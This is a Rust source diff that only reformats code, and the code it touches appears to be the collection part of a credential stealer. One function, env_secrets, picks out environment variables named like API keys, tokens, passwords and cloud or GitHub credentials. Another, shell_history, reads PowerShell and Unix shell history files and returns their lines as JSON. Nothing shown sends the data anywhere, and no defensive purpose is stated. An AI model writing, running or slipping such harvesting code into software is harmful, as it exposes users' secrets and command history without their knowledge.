@@ -1,10 +1,18 @@
-use serde_json::{Value};
+use serde_json::Value;
 use std::path::Path;
 
 pub fn env_secrets() -> Value {
     let interesting = [
-        "API_KEY", "SECRET", "TOKEN", "PASSWORD", "PASSWD",
-        "AWS_", "AZURE_", "GCP_", "GITHUB_", "PRIVATE_KEY",
+        "API_KEY",
+        "SECRET",
+        "TOKEN",
+        "PASSWORD",
+        "PASSWD",
+        "AWS_",
+        "AZURE_",
+        "GCP_",
+        "GITHUB_",
+        "PRIVATE_KEY",
     ];
     let vars: Vec<Value> = std::env::vars()
         .filter(|(k, _)| {
@@ -38,7 +46,12 @@ pub fn shell_history(_home: &str) -> Value {
         "{profile}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
     );
     let content = std::fs::read_to_string(&path).unwrap_or_default();
-    Value::Array(content.lines().map(|l| Value::String(l.to_string())).collect())
+    Value::Array(
+        content
+            .lines()
+            .map(|l| Value::String(l.to_string()))
+            .collect(),
+    )
 }
 
 #[cfg(not(target_os = "windows"))]
@@ -52,7 +65,12 @@ pub fn shell_history(home: &str) -> Value {
         .iter()
         .find_map(|p| std::fs::read_to_string(p).ok())
         .unwrap_or_default();
-    Value::Array(content.lines().map(|l| Value::String(l.to_string())).collect())
+    Value::Array(
+        content
+            .lines()
+            .map(|l| Value::String(l.to_string()))
+            .collect(),
+    )
 }
 
 #[cfg(target_os = "windows")]
